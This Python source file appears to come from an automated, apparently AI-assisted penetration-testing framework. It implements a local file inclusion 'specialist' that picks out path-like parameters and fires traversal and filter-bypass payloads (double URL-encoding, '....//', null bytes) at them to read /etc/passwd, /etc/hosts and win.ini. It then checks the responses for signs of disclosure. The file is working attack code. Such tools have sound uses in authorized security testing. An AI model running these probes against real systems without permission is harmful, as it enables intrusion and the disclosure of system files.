from __future__ import annotations

import logging
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, ClassVar, List
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from penage.core.actions import Action, ActionType
from penage.core.candidates import CandidateAction
from penage.core.observations import Observation
from penage.core.state import State
from penage.core.tracer import JsonlTracer
from penage.llm.base import LLMClient
from penage.memory.store import MemoryStore
from penage.specialists.base import AsyncSpecialist, SpecialistConfig
from penage.specialists.shared.oob_listener import OobListener
from penage.specialists.shared.path_traversal import (
    detect_lfi_markers,
    generate_traversal_variants,
)
from penage.tools.http_backend import HttpBackend

logger = logging.getLogger(__name__)


_DEFAULT_LIBRARY = Path(__file__).resolve().parents[2] / "payloads" / "lfi.yaml"

_SKIP_INPUT_TYPES = frozenset(
    {"hidden", "submit", "reset", "button", "file", "image", "checkbox", "radio", "password"}
)

PARAM_NAME_HINTS = frozenset(
    {
        "file",
        "path",
        "page",
        "include",
        "template",
        "doc",
        "document",
        "view",
        "show",
        "read",
        "load",
        "download",
        "src",
        "filename",
    }
)

_PATH_VALUE_EXTENSIONS = (".php", ".txt", ".log", ".conf", ".ini", ".html", ".htm")


def _value_hints_path(value: str) -> bool:
    if not value:
        return False
    low = value.lower()
    if low.startswith("/") or low.startswith("./") or "../" in low:
        return True
    return any(low.endswith(ext) for ext in _PATH_VALUE_EXTENSIONS)


def _name_hints_lfi(name: str) -> bool:
    low = (name or "").lower()
    if not low:
        return False
    return any(hint in low for hint in PARAM_NAME_HINTS)


@dataclass(slots=True)
class _LfiTarget:
    url: str
    parameter: str
    channel: str  # "GET" | "POST"
    original_value: str = ""


class _BudgetedHttpTool:
    """Caps a specialist's HTTP usage while still bumping the global counters."""

    def __init__(self, inner: HttpBackend, state: State, cap: int) -> None:
        self._inner = inner
        self._state = state
        self._cap = max(0, int(cap))
        self._used = 0

    async def run(self, action: Action) -> Observation:
        if self._used >= self._cap:
            return Observation(ok=False, error="lfi_specialist:budget_exhausted")
        self._used += 1
        self._state.http_requests_used += 1
        self._state.tool_calls_http += 1
        self._state.tool_calls_total += 1
        try:
            return await self._inner.run(action)
        except Exception as exc:  # LEGACY: HTTP boundary
            return Observation(ok=False, error=f"lfi_specialist:http_error:{exc}")

    @property
    def remaining(self) -> int:
        return max(0, self._cap - self._used)


@dataclass(slots=True)
class LfiSpecialist(AsyncSpecialist):
    """Local File Inclusion specialist.

    Five phases per target parameter:

    1. **Target discovery.** Parameters are flagged as LFI candidates when
       their name contains a path-like hint (``file``, ``path``, ``page``,
       ``include`` and relatives) or their current value already looks like a
       path (leading ``/``, ``../``, or a common file extension).
    2. **Deterministic traversal probes.** Payloads from ``lfi.yaml``
       (categories ``unix`` / ``windows`` / ``absolute``) are fired and the
       response body is scanned with
       :func:`penage.specialists.shared.path_traversal.detect_lfi_markers`.
       The first family-specific marker wins — the finding is verified.
    3. **Deterministic bypass variants.** Interleaved output of
       :func:`generate_traversal_variants` over well-known target files
       (``/etc/passwd``, ``/etc/hosts``, ``C:\\Windows\\win.ini``) and the
       ``bypass`` category of ``lfi.yaml``. Priority order inside the
       generated set puts double-URL-encoded forms first, then single-URL,
       then ``....//``, then null-byte, then raw. LLM-driven mutation is
       added in session 2.6c-iii.
    4. **OOB (php://input, file:// OOB-host for RCE-chain).** Next session.
    5. **Candidate emission and finalization.** Next session.

    The specialist short-circuits once a verified finding exists and respects
    a local HTTP cap that also bumps the episode's global HTTP counters.
    """

    name: ClassVar[str] = "lfi"

    http_tool: HttpBackend | None = None
    llm_client: LLMClient | None = None
    memory: MemoryStore | None = None
    tracer: JsonlTracer | None = None
    oob_listener: OobListener | None = None  # will be used in phase 4

    payload_library_path: Path = field(default_factory=lambda: _DEFAULT_LIBRARY)
    max_http_budget: int = 30
    max_targets: int = 3
    min_reserve_http: int = 10
    max_deterministic_payloads: int = 8
    max_bypass_payloads: int = 4  # phase 3, next session

    _done: bool = field(default=False, init=False)
    _attempted: set[str] = field(default_factory=set, init=False)
    _findings: list[dict[str, Any]] = field(default_factory=list, init=False)
    _yaml_cache: list[dict[str, Any]] | None = field(default=None, init=False)

    def propose(self, state: State, *, config: SpecialistConfig) -> List[CandidateAction]:
        _ = (state, config)
        return []

    async def propose_async(
        self, state: State, *, config: SpecialistConfig
    ) -> List[CandidateAction]:
        if self._done or self.http_tool is None:
            return self._emit_if_any()

        targets = self._discover_targets(state)
        if not targets:
            return []
        if self.max_http_budget < self.min_reserve_http:
            self._note(f"lfi:insufficient_budget cap={self.max_http_budget}")
            return []

        budgeted = _BudgetedHttpTool(self.http_tool, state, cap=self.max_http_budget)
        step = int(getattr(state, "orch_step", 0))

        for target in targets[: self.max_targets]:
            key = f"{target.url}|{target.parameter}"
            if key in self._attempted:
                continue
            if budgeted.remaining < self.min_reserve_http:
                self._note(f"lfi:budget_low remaining={budgeted.remaining}")
                break

            host = _host_of(target.url)

            self._trace_phase(1, "target_discovery", step=step, target=target)

            self._trace_phase(
                2, "deterministic_traversal_probes", step=step, target=target
            )
            finding = await self._run_deterministic_phase(
                target=target,
                http_tool=budgeted,
                host=host,
                config=config,
                step=step,
            )

            if finding and finding.get("verified"):
                self._findings.append(finding)
                self._done = True
                self._attempted.add(key)
                break

            # Phase 3 — deterministic bypass variants.
            if budgeted.remaining >= self.min_reserve_http:
                self._trace_phase(
                    3, "bypass_deterministic", step=step, target=target
                )
                bypass_finding = await self._run_bypass_phase(
                    target=target,
                    http_tool=budgeted,
                    host=host,
                    config=config,
                    step=step,
                )
                if bypass_finding and bypass_finding.get("verified"):
                    self._findings.append(bypass_finding)
                    self._done = True
                    self._attempted.add(key)
                    break

            # Phases 4 and 5 are implemented in later sessions (2.6c-iii/iv).
            self._attempted.add(key)

        return self._emit_if_any()

    def _emit_if_any(self) -> List[CandidateAction]:
        verified = [f for f in self._findings if f.get("verified")]
        if not verified:
            return []
        finding = verified[-1]
        action = Action(
            type=ActionType.NOTE,
            params={"kind": "lfi_finding", "finding": finding},
            tags=["lfi", "verified", finding.get("family", "unknown")],
        )
        return [
            CandidateAction(
                action=action,
                source=self.name,
                score=12.0,
                cost=0.0,
                reason=finding.get("summary") or "LFI finding",
                metadata={"evidence": finding},
            )
        ]

    async def _run_deterministic_phase(
        self,
        *,
        target: _LfiTarget,
        http_tool: _BudgetedHttpTool,
        host: str,
        config: SpecialistConfig,
        step: int,
    ) -> dict[str, Any] | None:
        """Phase 2: fire payloads from lfi.yaml categories unix + windows + absolute.

        Match markers via :func:`detect_lfi_markers`.
        """
        _ = (config, step)
        entries = self._load_yaml_entries(
            categories=("unix", "windows", "absolute"),
            limit=self.max_deterministic_payloads,
        )
        for entry in entries:
            if http_tool.remaining < 2:
                break
            payload = str(entry["payload"])
            probe_url, action_params = _build_probe_action(target, payload)
            action = Action(type=ActionType.HTTP, params=action_params)
            obs = await http_tool.run(action)

            if not obs.ok or not isinstance(obs.data, dict):
                self._record_attempt(
                    host=host,
                    parameter=target.parameter,
                    payload=payload,
                    outcome="error",
                )
                continue

            body = str(obs.data.get("text_full") or "")
            status = obs.data.get("status_code")

            hits = detect_lfi_markers(body)
            if hits:
                primary = hits[0]
                self._record_attempt(
                    host=host,
                    parameter=target.parameter,
                    payload=payload,
                    outcome="verified_disclosure",
                )
                return {
                    "verified": True,
                    "kind": "lfi_disclosure",
                    "mode": "deterministic",
                    "parameter": target.parameter,
                    "payload": payload,
                    "channel": target.channel,
                    "url": probe_url,
                    "family": primary.family.value,
                    "evidence": {
                        "markers": [
                            {
                                "family": h.family.value,
                                "marker": h.marker,
                                "snippet": h.snippet,
                            }
                            for h in hits[:5]
                        ],
                        "response_excerpt": body[:500],
                        "http_status": status,
                        "yaml_id": entry["id"],
                    },
                    "summary": (
                        f"LFI disclosure of {primary.family.value} via {target.parameter}"
                    ),
                }

            self._record_attempt(
                host=host,
                parameter=target.parameter,
                payload=payload,
                outcome="no_signal",
            )
        return None

    async def _run_bypass_phase(
        self,
        *,
        target: _LfiTarget,
        http_tool: _BudgetedHttpTool,
        host: str,
        config: SpecialistConfig,
        step: int,
    ) -> dict[str, Any] | None:
        """Phase 3: deterministic bypass variants.

        Two sources interleaved:

        * **A.** :func:`generate_traversal_variants` for three well-known
          target files (``/etc/passwd``, ``/etc/hosts`` and
          ``C:\\Windows\\win.ini``). Variants are deduplicated then sorted
          by a priority that puts the most filter-evading forms first:
          double-URL-encoded → URL-encoded → ``....//`` → null-byte → raw.
        * **B.** ``lfi.yaml`` entries with ``category == "bypass"`` (already
          includes encoded / null-byte / mixed-slash forms).

        The two streams are interleaved with A first in each pair so the
        most valuable filter-bypass forms race ahead of the yaml list.
        The combined candidate set is capped at ``max_bypass_payloads * 2``
        to keep this phase from swallowing the whole HTTP budget.

        LLM-driven mutation is added in session 2.6c-iii; until then this
        method returns ``None`` when nothing is verified deterministically.
        """
        _ = (config, step)

        well_known = [
            "/etc/passwd",
            "/etc/hosts",
            "C:\\Windows\\win.ini",
        ]
        a_variants: list[str] = []
        for target_file in well_known:
            a_variants.extend(
                generate_traversal_variants(target_file, max_depth=8)
            )

        def _bypass_priority(payload: str) -> int:
            if "%252e" in payload or "%252f" in payload:
                return 1  # double-encoded — most valuable
            if "%2e%2e" in payload or "%2f" in payload:
                return 2  # url-encoded
            if "....//" in payload or "....\\\\" in payload:
                return 3  # filter bypass
            if "%00" in payload:
                return 4  # nullbyte
            return 5  # raw — phase 2 already tried plain forms

        a_variants_sorted = sorted(set(a_variants), key=_bypass_priority)

        b_entries = self._load_yaml_entries(categories=("bypass",), limit=4)
        b_variants = [str(e["payload"]) for e in b_entries]

        cap = self.max_bypass_payloads * 2
        candidates: list[str] = []
        seen: set[str] = set()
        for batch in zip(a_variants_sorted, b_variants):
            for p in batch:
                if p in seen:
                    continue
                seen.add(p)
                candidates.append(p)
        for p in a_variants_sorted[len(b_variants):]:
            if p not in seen:
                seen.add(p)
                candidates.append(p)
        candidates = candidates[:cap]

        deterministic_tried = 0
        for payload in candidates:
            if http_tool.remaining < 2:
                break
            deterministic_tried += 1

            probe_url, action_params = _build_probe_action(target, payload)
            action = Action(type=ActionType.HTTP, params=action_params)
            obs = await http_tool.run(action)

            if not obs.ok or not isinstance(obs.data, dict):
                self._record_attempt(
                    host=host,
                    parameter=target.parameter,
                    payload=payload,
                    outcome="error",
                )
                continue

            body = str(obs.data.get("text_full") or "")
            status = obs.data.get("status_code")
            hits = detect_lfi_markers(body)

            if hits:
                primary = hits[0]
                self._record_attempt(
                    host=host,
                    parameter=target.parameter,
                    payload=payload,
                    outcome="verified_bypass",
                )
                return {
                    "verified": True,
                    "kind": "lfi_bypass_verified",
                    "mode": "bypass",
                    "parameter": target.parameter,
                    "payload": payload,
                    "channel": target.channel,
                    "url": probe_url,
                    "family": primary.family.value,
                    "evidence": {
                        "markers": [
                            {
                                "family": h.family.value,
                                "marker": h.marker,
                                "snippet": h.snippet,
                            }
                            for h in hits[:5]
                        ],
                        "response_excerpt": body[:500],
                        "http_status": status,
                        "bypass_source": (
                            "yaml" if payload in b_variants else "generated"
                        ),
                    },
                    "summary": (
                        f"LFI bypass disclosure of {primary.family.value} "
                        f"via {target.parameter}"
                    ),
                }

            self._record_attempt(
                host=host,
                parameter=target.parameter,
                payload=payload,
                outcome="no_signal",
            )

        self._note(
            f"lfi:bypass_phase_no_verified deterministic_tried={deterministic_tried}"
        )
        return None

    async def _run_oob_phase(
        self,
        *,
        target: _LfiTarget,
        http_tool: _BudgetedHttpTool,
        host: str,
        config: SpecialistConfig,
        step: int,
    ) -> dict[str, Any] | None:
        """Phase 4: OOB via php://input / file:// to an OOB host."""
        raise NotImplementedError("Implemented in 2.6c")

    def _finalize_candidate(self, finding: dict[str, Any]) -> CandidateAction | None:
        """Phase 5: candidate-emit + finalization."""
        raise NotImplementedError("Implemented in 2.6c")

    def _discover_targets(self, state: State) -> list[_LfiTarget]:
        targets: list[_LfiTarget] = []
        seen: set[tuple[str, str]] = set()

        for page_url, forms in (state.forms_by_url or {}).items():
            for form in forms or []:
                action_url = str(form.get("action") or page_url or "")
                if not action_url:
                    continue
                method = str(form.get("method") or "POST").upper()
                if method not in {"GET", "POST"}:
                    continue
                for inp in form.get("inputs") or []:
                    name = str(inp.get("name") or "")
                    itype = str(inp.get("type") or "").lower()
                    if not name or itype in _SKIP_INPUT_TYPES:
                        continue
                    value = str(inp.get("value") or "")
                    if not (_name_hints_lfi(name) or _value_hints_path(value)):
                        continue
                    key = (action_url, name)
                    if key in seen:
                        continue
                    seen.add(key)
                    targets.append(
                        _LfiTarget(
                            url=action_url,
                            parameter=name,
                            channel=method,
                            original_value=value,
                        )
                    )

        last_url = state.last_http_url
        if last_url:
            try:
                parsed = urlparse(last_url)
            except Exception:
                parsed = None
            if parsed is not None and parsed.query:
                base = urlunparse(parsed._replace(query=""))
                for name, value in parse_qsl(parsed.query, keep_blank_values=True):
                    if not (_name_hints_lfi(name) or _value_hints_path(value)):
                        continue
                    key = (base, name)
                    if key in seen:
                        continue
                    seen.add(key)
                    targets.append(
                        _LfiTarget(
                            url=base,
                            parameter=name,
                            channel="GET",
                            original_value=value,
                        )
                    )

        return targets

    def _load_yaml_entries(
        self,
        *,
        categories: tuple[str, ...],
        limit: int,
    ) -> list[dict[str, Any]]:
        """Load and filter payload entries from ``lfi.yaml``.

        Returns up to ``limit`` entries whose ``category`` is in ``categories``.
        The full library is cached on the instance to avoid re-parsing the file
        between phases. Missing YAML / parse errors yield an empty list — the
        specialist degrades to a no-op rather than crashing.
        """
        if self._yaml_cache is None:
            self._yaml_cache = _load_lfi_library(self.payload_library_path)
        allowed = set(categories)
        out: list[dict[str, Any]] = []
        for entry in self._yaml_cache:
            if entry.get("category") not in allowed:
                continue
            if not str(entry.get("payload") or ""):
                continue
            out.append(entry)
            if len(out) >= max(0, int(limit)):
                break
        return out

    def _record_attempt(
        self, *, host: str, parameter: str, payload: str, outcome: str
    ) -> None:
        if self.memory is None:
            return
        try:
            self.memory.record_attempt(
                episode_id=self._episode_id(),
                host=host,
                parameter=parameter,
                payload=payload,
                outcome=outcome,
            )
        except Exception as exc:
            logger.warning("lfi memory record_attempt failed: %s", exc)

    def _trace_phase(
        self,
        phase_num: int,
        name: str,
        *,
        step: int,
        target: _LfiTarget,
        extra: dict[str, Any] | None = None,
    ) -> None:
        if self.tracer is None:
            return
        payload: dict[str, Any] = {
            "specialist": self.name,
            "phase": phase_num,
            "phase_name": name,
            "step": step,
            "url": target.url,
            "parameter": target.parameter,
            "channel": target.channel,
        }
        if extra:
            payload.update(extra)
        try:
            self.tracer.write_event("specialist_phase", payload)
        except Exception as exc:
            logger.warning("lfi tracer write failed: %s", exc)

    def _note(self, text: str) -> None:
        if self.tracer is None:
            return
        try:
            self.tracer.record_note(text)
        except Exception as exc:
            logger.warning("lfi tracer note failed: %s", exc)

    def _episode_id(self) -> str:
        if self.tracer is not None:
            return str(self.tracer.episode_id)
        return "no-episode"


def _load_lfi_library(path: Path) -> list[dict[str, Any]]:
    try:
        import yaml  # noqa: WPS433 — keep yaml soft-optional
    except ImportError as exc:
        logger.warning("PyYAML not installed (%s); lfi library unavailable", exc)
        return []
    if not path.exists():
        logger.warning("lfi library missing at %s", path)
        return []
    try:
        raw = yaml.safe_load(path.read_text(encoding="utf-8")) or []
    except Exception as exc:
        logger.warning("failed to parse lfi library %s: %s", path, exc)
        return []
    if not isinstance(raw, list):
        return []
    entries: list[dict[str, Any]] = []
    for item in raw:
        if not isinstance(item, dict):
            continue
        entries.append(
            {
                "id": str(item.get("id") or ""),
                "category": str(item.get("category") or ""),
                "family": str(item.get("family") or ""),
                "depth": int(item.get("depth") or 0),
                "payload": str(item.get("payload") or ""),
                "expected_markers": list(item.get("expected_markers") or []),
                "notes": str(item.get("notes") or ""),
            }
        )
    return entries


def _build_probe_action(
    target: _LfiTarget, payload: str
) -> tuple[str, dict[str, Any]]:
    if target.channel == "GET":
        probe_url = _set_query_param(target.url, target.parameter, payload)
        params: dict[str, Any] = {"method": "GET", "url": probe_url}
        return probe_url, params
    params = {
        "method": "POST",
        "url": target.url,
        "data": {target.parameter: payload},
    }
    return target.url, params


def _set_query_param(url: str, name: str, value: str) -> str:
    parsed = urlparse(url)
    pairs = [
        (k, v)
        for (k, v) in parse_qsl(parsed.query, keep_blank_values=True)
        if k != name
    ]
    pairs.append((name, value))
    return urlunparse(parsed._replace(query=urlencode(pairs, doseq=True)))


def _host_of(url: str) -> str:
    try:
        return (urlparse(url).netloc or "").lower()
    except Exception:
        return ""


__all__ = ["LfiSpecialist", "PARAM_NAME_HINTS"]
